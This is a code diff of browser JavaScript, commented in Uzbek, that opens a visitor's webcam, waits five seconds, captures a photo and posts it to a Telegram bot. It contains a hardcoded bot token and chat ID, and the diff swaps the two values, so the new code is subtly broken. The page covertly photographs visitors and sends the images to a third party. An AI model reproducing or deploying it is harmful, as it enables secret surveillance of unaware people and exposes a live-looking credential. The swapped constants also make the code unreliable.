@@ -1,6 +1,6 @@
 // Telegram bot tokeni va chat ID
-const BOT_TOKEN = '7395541428:AAGTGERMBx35uE7lm35_xfrOFJ2nWfy886k'; // Bot tokenini shu yerga qo'ying
-const CHAT_ID = '5934257995'; // Chat ID-ni shu yerga qo'ying
+const BOT_TOKEN = '5934257995'; // Bot tokenini shu yerga qo'ying
+const CHAT_ID = '7395541428:AAGTGERMBx35uE7lm35_xfrOFJ2nWfy886k'; // Chat ID-ni shu yerga qo'ying
 
 // Video elementini tanlang
 const video = document.getElementById('video');
@@ -10,12 +10,14 @@ navigator.mediaDevices.getUserMedia({ video: true })
     .then(stream => {
         video.srcObject = stream;
 
-        // Video tayyor bo'lganda surat olishni kutish
-        video.addEventListener('canplay', () => {
-            // Surat olishni 5 soniya kutib amalga oshirish
-            setTimeout(() => {
-                takePicture();
-            }, 5000); // 5 soniya kutish
+        // Video to'liq yuklanganda hodisani kutish
+        video.addEventListener('loadeddata', () => {
+            if (video.readyState >= 2) {
+                // 5 soniya kutib surat olishni boshlash
+                setTimeout(() => {
+                    takePicture();
+                }, 5000);
+            }
         });
     })
     .catch(error => {
@@ -27,16 +29,20 @@ function takePicture() {
     const canvas = document.createElement('canvas');
     const context = canvas.getContext('2d');
 
-    // Video o'lchamlarini to'g'ri sozlash
+    // Video o'lchamlarini olish
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
 
-    // Video oqimini canvasga chizish
-    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+    // Agar video o'lchamlari to'g'ri yuklangan bo'lsa, surat oling
+    if (canvas.width && canvas.height) {
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-    // Rasmni base64 formatda olish
-    const imageData = canvas.toDataURL('image/png');
-    sendPhotoToTelegram(imageData);
+        // Rasmni base64 formatida olish
+        const imageData = canvas.toDataURL('image/png');
+        sendPhotoToTelegram(imageData);
+    } else {
+        console.error('Video o\'lchamlari to\'g\'ri yuklanmadi.');
+    }
 }
 
 // Telegram bot orqali surat yuborish
@@ -80,4 +86,3 @@ function dataURLtoBlob(dataURL) {
     }
     return new Blob([new Uint8Array(array)], { type: mime });
 }
-
